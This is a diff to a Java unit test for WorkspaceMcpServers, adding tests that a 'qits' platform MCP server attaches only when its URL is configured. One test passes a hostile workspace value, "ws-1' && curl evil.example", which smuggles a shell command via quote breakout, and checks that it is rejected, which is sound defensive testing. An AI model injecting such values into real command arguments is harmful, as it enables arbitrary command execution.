@@ -50,7 +50,13 @@ class WorkspaceMcpServersTest {
         }
       };
 
-  private final WorkspaceMcpServers servers = new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE);
+  private static final String PLATFORM_URL = "http://qits-platform-access-mcp-service:8080/mcp";
+
+  private final WorkspaceMcpServers servers =
+      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL));
+
+  private final WorkspaceMcpServers withoutPlatformUrl =
+      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.empty());
 
   @Test
   void theSeamIsImplementedRatherThanLeftOnTheLibrarysDefault() {
@@ -130,7 +136,8 @@ class WorkspaceMcpServersTest {
     // The url ends up inside a single-quoted launch argument and the renderer does no escaping of
     // its own, so the grammar check is the boundary.
     WorkspaceMcpServers hostile =
-        new WorkspaceMcpServers(ENDPOINTS, REPO, "ws-1' && curl evil.example");
+        new WorkspaceMcpServers(
+            ENDPOINTS, REPO, "ws-1' && curl evil.example", Optional.of(PLATFORM_URL));
 
     assertThrows(
         InvalidCommandRequestException.class,
@@ -165,5 +172,62 @@ class WorkspaceMcpServersTest {
 
   private ScopedMcp serverFor(String key, AgentMcpNarrowing narrowing, AgentMcpScope scope) {
     return servers.serverFor(key, scope, narrowing).orElseThrow();
+  }
+
+  /**
+   * The central {@code qits} platform MCP server (qits-630) — present exactly when {@code
+   * qits.platform-mcp.url} is configured and the surface's document attaches it, on every one of
+   * this daemon's four surfaces: {@code epic.chat}, {@code epic.agent}, {@code workspace.chat} and
+   * {@code workspace.agent}. The document (built by qits-projects-service's {@code
+   * AgentSurfaceDefaults}, outside this repository) is what carries the per-surface toggle and the
+   * scope those four always ask with — all of it narrows to {@link AgentMcpScope#REPOSITORY} here —
+   * so one assertion stands for all four rather than four identical copies of it.
+   */
+  private static final List<AgentMcpScope> WORKSPACE_SURFACE_SCOPES =
+      List.of(
+          AgentMcpScope.REPOSITORY, // epic.chat
+          AgentMcpScope.REPOSITORY, // epic.agent
+          AgentMcpScope.REPOSITORY, // workspace.chat
+          AgentMcpScope.REPOSITORY); // workspace.agent
+
+  @Test
+  void qitsAttachesOnEveryWorkspaceSurfaceWhenTheUrlIsConfigured() {
+    for (AgentMcpScope scope : WORKSPACE_SURFACE_SCOPES) {
+      assertEquals(
+          Optional.of(new ScopedMcp("qits", PLATFORM_URL, List.of())),
+          servers.serverFor("qits", scope, new AgentMcpNarrowing(false, false, false)));
+    }
+  }
+
+  @Test
+  void qitsIsAbsentRatherThanRefusingOnEveryWorkspaceSurfaceWhenTheUrlIsNotConfigured() {
+    for (AgentMcpScope scope : WORKSPACE_SURFACE_SCOPES) {
+      assertEquals(
+          Optional.empty(),
+          withoutPlatformUrl.serverFor("qits", scope, new AgentMcpNarrowing(false, false, false)));
+    }
+  }
+
+  @Test
+  void qitsCarriesNoQueryParametersWhateverTheNarrowingAsks() {
+    // The session is scoped by its own bearer on every call, not by the url — unlike repository
+    // and observability, a narrowing request (even one asking for all three ids) changes nothing.
+    assertEquals(
+        PLATFORM_URL, serverFor("qits", new AgentMcpNarrowing(true, true, true)).url());
+  }
+
+  @Test
+  void qitsIsAbsentFromTheHostedDefaultMapping() {
+    // The hosted default (serversFor) is what a container born without a mounted document falls
+    // back to, and that is "the surface turns it off" in its most total form: nothing there has a
+    // per-surface toggle to turn qits on with, so a pre-qits-630 container must keep attaching
+    // exactly what it always attached. The per-surface switch is the document's
+    // AgentMcpAttachment list (qits-projects-service's AgentSurfaceDefaults), reached only through
+    // serverFor above — never through here.
+    for (AgentMcpScope scope : AgentMcpScope.values()) {
+      assertTrue(
+          servers.serversFor(scope).stream().noneMatch(server -> server.key().equals("qits")),
+          scope.toString());
+    }
   }
 }
